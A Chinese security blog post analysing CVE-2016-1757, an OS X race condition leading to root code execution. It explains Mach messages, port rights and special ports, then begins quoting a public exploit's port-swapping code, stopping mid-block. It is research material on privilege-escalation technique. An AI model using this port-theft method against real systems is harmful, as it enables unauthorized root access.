<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>再看CVE-2016-1757---浅析mach message的使用 | mrh的学习分享</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="0x00 摘要CVE-2016-1757是一个OS X系统上通过条件竞争实现任意代码在root权限执行的漏洞。在这篇文章之前，我已经分析过了这个漏洞的原理，以及EXP代码的实现。
CVE-2016-1757简单分析
CVE-2016-1757利用程序分析
利用patch绕过kextload对内核签名的检测
在syscan2016上又有国外的安全研究人员放出自己的利用代码。学习之后，这个利用代码确实">
<meta property="og:type" content="article">
<meta property="og:title" content="再看CVE-2016-1757---浅析mach message的使用">
<meta property="og:url" content="http://turingh.github.io/2016/07/05/再看CVE-2016-1757浅析mach message的使用/index.html">
<meta property="og:site_name" content="mrh的学习分享">
<meta property="og:description" content="0x00 摘要CVE-2016-1757是一个OS X系统上通过条件竞争实现任意代码在root权限执行的漏洞。在这篇文章之前，我已经分析过了这个漏洞的原理，以及EXP代码的实现。
CVE-2016-1757简单分析
CVE-2016-1757利用程序分析
利用patch绕过kextload对内核签名的检测
在syscan2016上又有国外的安全研究人员放出自己的利用代码。学习之后，这个利用代码确实">
<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/simple_message.png?1">
<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/complex_message.png?1">
<meta property="og:image" content="http://blog.ibireme.com/wp-content/uploads/2015/05/RunLoop_5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/port_dance.png">
<meta property="og:updated_time" content="2016-07-06T06:16:13.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="再看CVE-2016-1757---浅析mach message的使用">
<meta name="twitter:description" content="0x00 摘要CVE-2016-1757是一个OS X系统上通过条件竞争实现任意代码在root权限执行的漏洞。在这篇文章之前，我已经分析过了这个漏洞的原理，以及EXP代码的实现。
CVE-2016-1757简单分析
CVE-2016-1757利用程序分析
利用patch绕过kextload对内核签名的检测
在syscan2016上又有国外的安全研究人员放出自己的利用代码。学习之后，这个利用代码确实">
  
    <link rel="alternative" href="/atom.xml" title="mrh的学习分享" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/touxiang.jpeg">
  
  
  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/touxiang.jpeg" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/">mrh</a></h1>
        </hgroup>

        
        <p class="header-subtitle">胸口写一个勇字</p>
        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">博客首页</a></li>
                        
                            <li><a href="/archives">所有文章</a></li>
                        
                            <li><a href="https://github.com/turingH/OSX_CRACKME">CrackMe</a></li>
                        
                            <li><a href="https://raw.githubusercontent.com/turingH/ad/master/README.md">安全站点</a></li>
                        
                            <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.4/10.11.4_03_22_16.csv">10.11.4补丁</a></li>
                        
                            <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.5/10.11.5_05_16_16.csv">10.11.5补丁</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl github" target="_blank" href="https://github.com/turingH" title="github">github</a>
                            
                                <a class="fl weibo" target="_blank" href="http://weibo.com/u/2047262653" title="weibo">weibo</a>
                            
                                <a class="fl twitter" target="_blank" href="https://twitter.com/samulehuang" title="twitter">twitter</a>
                            
                                <a class="fl facebook" target="_blank" href="https://www.facebook.com/huang.samuel.94" title="facebook">facebook</a>
                            
                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/CVE/" style="font-size: 20px;">CVE</a> <a href="/tags/DWORDSHOOT/" style="font-size: 10px;">DWORDSHOOT</a> <a href="/tags/IOS/" style="font-size: 10px;">IOS</a> <a href="/tags/OS-X/" style="font-size: 14px;">OS X</a> <a href="/tags/OSX/" style="font-size: 12px;">OSX</a> <a href="/tags/POC/" style="font-size: 14px;">POC</a> <a href="/tags/Pegasus/" style="font-size: 10px;">Pegasus</a> <a href="/tags/XNU/" style="font-size: 14px;">XNU</a> <a href="/tags/bounds-checking/" style="font-size: 10px;">bounds checking</a> <a href="/tags/dlopen/" style="font-size: 10px;">dlopen</a> <a href="/tags/dns/" style="font-size: 12px;">dns</a> <a href="/tags/dos/" style="font-size: 10px;">dos</a> <a href="/tags/dyld/" style="font-size: 18px;">dyld</a> <a href="/tags/dynamic-link/" style="font-size: 10px;">dynamic link</a> <a href="/tags/execv/" style="font-size: 14px;">execv</a> <a href="/tags/execve/" style="font-size: 10px;">execve</a> <a href="/tags/exploit/" style="font-size: 20px;">exploit</a> <a href="/tags/frame-faking/" style="font-size: 10px;">frame-faking</a> <a href="/tags/free/" style="font-size: 10px;">free</a> <a href="/tags/freebsd/" style="font-size: 10px;">freebsd</a> <a href="/tags/gethostbyname/" style="font-size: 12px;">gethostbyname</a> <a href="/tags/glibc/" style="font-size: 12px;">glibc</a> <a href="/tags/heap/" style="font-size: 18px;">heap</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/kernel/" style="font-size: 16px;">kernel</a> <a href="/tags/kextload/" style="font-size: 10px;">kextload</a> <a href="/tags/level02/" style="font-size: 10px;">level02</a> <a href="/tags/linux/" style="font-size: 12px;">linux</a> <a href="/tags/mach-o/" style="font-size: 20px;">mach-o</a> <a href="/tags/malloc/" style="font-size: 12px;">malloc</a> <a href="/tags/nano/" style="font-size: 10px;">nano</a> <a href="/tags/openssl/" style="font-size: 10px;">openssl</a> <a href="/tags/osx/" style="font-size: 18px;">osx</a> <a href="/tags/patch/" style="font-size: 10px;">patch</a> <a href="/tags/ports/" style="font-size: 14px;">ports</a> <a href="/tags/race/" style="font-size: 14px;">race</a> <a href="/tags/sandbox/" style="font-size: 10px;">sandbox</a> <a href="/tags/stack/" style="font-size: 14px;">stack</a> <a href="/tags/stackoverflow/" style="font-size: 12px;">stackoverflow</a> <a href="/tags/unlink/" style="font-size: 10px;">unlink</a> <a href="/tags/wargame/" style="font-size: 12px;">wargame</a> <a href="/tags/基本功要扎实/" style="font-size: 12px;">基本功要扎实</a>
                    </div>
                </section>
                
                
                

                
                
                <section class="switch-part switch-part3">
                
                    <div id="js-aboutme">啥也不说了，先干黄旭东</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">mrh</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/touxiang.jpeg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">mrh</a></h1>
            </hgroup>
            
            <p class="header-subtitle">胸口写一个勇字</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">博客首页</a></li>
                
                    <li><a href="/archives">所有文章</a></li>
                
                    <li><a href="https://github.com/turingH/OSX_CRACKME">CrackMe</a></li>
                
                    <li><a href="https://raw.githubusercontent.com/turingH/ad/master/README.md">安全站点</a></li>
                
                    <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.4/10.11.4_03_22_16.csv">10.11.4补丁</a></li>
                
                    <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.5/10.11.5_05_16_16.csv">10.11.5补丁</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="github" target="_blank" href="https://github.com/turingH" title="github">github</a>
                    
                        <a class="weibo" target="_blank" href="http://weibo.com/u/2047262653" title="weibo">weibo</a>
                    
                        <a class="twitter" target="_blank" href="https://twitter.com/samulehuang" title="twitter">twitter</a>
                    
                        <a class="facebook" target="_blank" href="https://www.facebook.com/huang.samuel.94" title="facebook">facebook</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-再看CVE-2016-1757浅析mach message的使用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/05/再看CVE-2016-1757浅析mach message的使用/" class="article-date">
      <time datetime="2016-07-06T00:55:33.000Z" itemprop="datePublished">2016-07-05</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      再看CVE-2016-1757---浅析mach message的使用
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/OS-X/">OS X</a><a class="article-category-link" href="/categories/OS-X/CVE/">CVE</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE/">CVE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/execv/">execv</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ports/">ports</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/race/">race</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="0x00_摘要">0x00 摘要</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1757" target="_blank" rel="external">CVE-2016-1757</a>是一个<code>OS X</code>系统上通过条件竞争实现任意代码在<code>root</code>权限执行的漏洞。在这篇文章之前，我已经分析过了这个漏洞的原理，以及<code>EXP</code>代码的实现。</p>
<p><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757简单分析</a></p>
<p><a href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/">CVE-2016-1757利用程序分析</a></p>
<p><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a></p>
<p>在<code>syscan2016</code>上又有国外的安全研究人员放出自己的<a href="https://github.com/gdbinit/mach_race" target="_blank" rel="external">利用代码</a>。学习之后，这个利用代码确实比之前的更加清晰、明确。更加容易理解。</p>
<p>而两个利用本质上面的不同是对<code>mach port</code>的不同的利用方法。下面主要结合两个不同的POC，来分析一下<code>mach message</code>的使用，同时也是研究<code>xnu</code>的<code>IPC</code>的基础。</p>
<a id="more"></a>
<h1 id="0x01_Mach">0x01 Mach</h1><p><code>Mach</code>在<code>OS X</code>的内核中处于最接近底层的一个模块。是<code>XNU</code>内核的内核。是一个<code>BSD</code>层包裹的<code>微内核</code>。而内核中的<code>task</code>,<code>thread</code>,<code>virtual memory</code>等模块，对于<code>Mach</code>来说，都是一个<code>Object</code>。这些<code>Objects</code>基于<code>Mach</code>实现自己的功能，并且通过<code>Mach Message</code>来进行相互之间的通信。</p>
<blockquote>
<p>The Mach kernel thus becomes a low-level foundation, concerning itself with only the bare mini-mum required for driving the operating system. Everything else may be implemented by some higher    layer of an operating system, which then draws on the Mach primitives and manipulate them inwhatever way it sees fit.                                        </p>
<p>​                                                                                                           ——–Mac OS® X and iOS Internals    </p>
</blockquote>
<h2 id="1-1_Mach_Messages">1.1 Mach Messages</h2><p><code>Mach Messages</code>总共有两种，分别是<code>Simple Messages</code>和<code>Complex Messages</code>。</p>
<h3 id="1-1-1_Simple_Message">1.1.1 Simple Message</h3><p><code>Simple Message</code>的结构体，大致如下图所示。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/simple_message.png?1" alt="simple message"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">natural_t</span>			pad1;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>		pad2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>			pad3 : <span class="number">24</span>;</span><br><span class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>	type : <span class="number">8</span>;</span><br><span class="line">&#125; <span class="keyword">mach_msg_type_descriptor_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span> msgh_descriptor_count;</span><br><span class="line">&#125; <span class="keyword">mach_msg_body_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="keyword">struct</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">mach_msg_bits_t</span>	msgh_bits;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>	msgh_size;</span><br><span class="line">  <span class="keyword">mach_port_t</span>		msgh_remote_port;</span><br><span class="line">  <span class="keyword">mach_port_t</span>		msgh_local_port;</span><br><span class="line">  <span class="keyword">mach_port_name_t</span>	msgh_voucher_port;</span><br><span class="line">  <span class="keyword">mach_msg_id_t</span>		msgh_id;</span><br><span class="line">&#125; <span class="keyword">mach_msg_header_t</span>;</span><br></pre></td></tr></table></figure>
<p>在使用<code>mach message</code>时,可以自己定义一个数据结构，更方便的编写代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">    <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">    <span class="keyword">mach_msg_type_descriptor_t</span> type;</span><br><span class="line">&#125; message;</span><br><span class="line"></span><br><span class="line">message.header = (<span class="keyword">mach_msg_header_t</span>) &#123;</span><br><span class="line">    .msgh_remote_port = port,</span><br><span class="line">    .msgh_local_port = MACH_PORT_NULL,</span><br><span class="line">    .msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, <span class="number">0</span>),</span><br><span class="line">    .msgh_size = <span class="keyword">sizeof</span>(message)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">message.body = (<span class="keyword">mach_msg_body_t</span>) &#123;</span><br><span class="line">    .msgh_descriptor_count = <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">message.type = (<span class="keyword">mach_msg_type_descriptor_t</span>) &#123;</span><br><span class="line">    .pad1 = data,</span><br><span class="line">    .pad2 = <span class="keyword">sizeof</span>(data)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>构建一个<code>message</code>，然后调用<code>mach API</code>发送这个消息。当然<code>msgh_descriptor_count</code>也可以是其他值，那么就要有相对于个数的<code>mach_msg_type_descriptor_t</code>。</p>
<h3 id="1-1-2_Complex_Messages">1.1.2 Complex Messages</h3><p><code>Complex Messages</code>和<code>Simple Message</code>对比，多了一个附加的数据<code>Mach Trailers</code>。并且数据描述符的定义也不同了。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/complex_message.png?1" alt="complex message"></p>
<p>描述符的定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span>*				address;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> !defined(__LP64__)</span></span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>       	size;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">boolean_t</span>     		deallocate: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">mach_msg_copy_options_t</span>       copy: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     		pad1: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>    type: <span class="number">8</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__LP64__)</span></span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>       	size;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">mach_msg_ool_descriptor_t</span>;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_ports">1.2 ports</h2><h3 id="1-2-1_port_的权限">1.2.1 port 的权限</h3><p>每一条<code>Mach Message</code>都是从一个<code>port</code>发送到另外一个<code>port</code>，而每一个<code>port</code>都有自己的权限。</p>
<ul>
<li>SEND：将<code>Mach Message</code>添加到<code>port</code>的队列中。</li>
<li>RECIVE：允许从队列中读取<code>Mach Message</code>。一般情况下只有<code>port</code>的持有者拥有这个权利。</li>
</ul>
<p><code>port</code>以及他的<code>权限</code>，可以从一个进程转交给另外一个进程，这也就是这一次要分析的<code>EXP</code>的主要原理。</p>
<h3 id="1-2-2_一些特殊的port">1.2.2 一些特殊的port</h3><p>当每一个<code>task</code>被创建的时候，系统都会提供一系列特殊的<code>port</code>，在这些<code>port</code>当中，我们比较感兴趣的是以下几种：</p>
<ul>
<li>host port：代表正在运行该<code>task</code>的整台机器的<code>port</code>。</li>
<li>task port: 正在运行的<code>task</code>本身的<code>port</code>。</li>
<li>bootstrap port : 和<code>bootstrap server</code>连接着的一个<code>port</code>。</li>
</ul>
<h2 id="1-3_Send&amp;Recv_Messages">1.3 Send&amp;Recv Messages</h2><p><code>Message</code>的发送与接收，都是使用同一个<code>mach API</code>，<code>mach_msg</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kr = mach_msg(recv_hdr,              <span class="comment">// message buffer</span></span><br><span class="line">              msg_options,          <span class="comment">// option indicating receive</span></span><br><span class="line">              <span class="number">0</span>,                     <span class="comment">// send size</span></span><br><span class="line">              recv_hdr-&gt;msgh_size,   <span class="comment">// size of header + body</span></span><br><span class="line">              server_port,           <span class="comment">// receive name</span></span><br><span class="line">              MACH_MSG_TIMEOUT_NONE, <span class="comment">// no timeout, wait forever</span></span><br><span class="line">              MACH_PORT_NULL);       <span class="comment">// no notification port</span></span><br><span class="line"></span><br><span class="line">kr = mach_msg(send_hdr,              <span class="comment">// message buffer</span></span><br><span class="line">              MACH_SEND_MSG,         <span class="comment">// option indicating send</span></span><br><span class="line">              send_hdr-&gt;msgh_size,   <span class="comment">// size of header + body</span></span><br><span class="line">              <span class="number">0</span>,                     <span class="comment">// receive limit</span></span><br><span class="line">              MACH_PORT_NULL,        <span class="comment">// receive name</span></span><br><span class="line">              MACH_MSG_TIMEOUT_NONE, <span class="comment">// no timeout, wait forever</span></span><br><span class="line">              MACH_PORT_NULL);       <span class="comment">// no notification port</span></span><br></pre></td></tr></table></figure>
<p>根据参数的不同，实现了接收<code>Message</code>和发送<code>Message</code>不同的功能。</p>
<p>通过对源码的阅读，<code>mach_msg</code>实际上是调用了<code>mach_msg_overwrite_trap</code>，进入内核中，通过<code>ipc_kmsg_*</code>系列函数，来实现的消息发送与接收。大致如下图所示。</p>
<p><img src="http://blog.ibireme.com/wp-content/uploads/2015/05/RunLoop_5.png" alt=""></p>
<p>图片转自(<a href="http://blog.ibireme.com/2015/05/18/runloop/)。" target="_blank" rel="external">http://blog.ibireme.com/2015/05/18/runloop/)。</a></p>
<h2 id="0x02_The_Port_Swap_Dance">0x02 The Port Swap Dance</h2><p>了解了<code>port</code>和<code>Mach Message</code>的基础知识之后，先来回顾一下我们已经<a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=226154" target="_blank" rel="external">分析过的EXP中</a>，有这样一段代码。</p>
<h3 id="2-1_源码">2.1 源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">  <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">  <span class="keyword">mach_msg_port_descriptor_t</span> port;</span><br><span class="line">&#125; <span class="keyword">port_msg_send_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mach message for receiving a port right</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">  <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">  <span class="keyword">mach_msg_port_descriptor_t</span> port;</span><br><span class="line">  <span class="keyword">mach_msg_trailer_t</span> trailer;</span><br><span class="line">&#125; <span class="keyword">port_msg_rcv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span>  header;</span><br><span class="line">&#125; <span class="keyword">simple_msg_send_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span>  header;</span><br><span class="line">  <span class="keyword">mach_msg_trailer_t</span> trailer;</span><br><span class="line">&#125; <span class="keyword">simple_msg_rcv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a copy in the parent of the stolen special port such that it can be restored</span></span><br><span class="line"><span class="keyword">mach_port_t</span> saved_special_port = MACH_PORT_NULL;</span><br><span 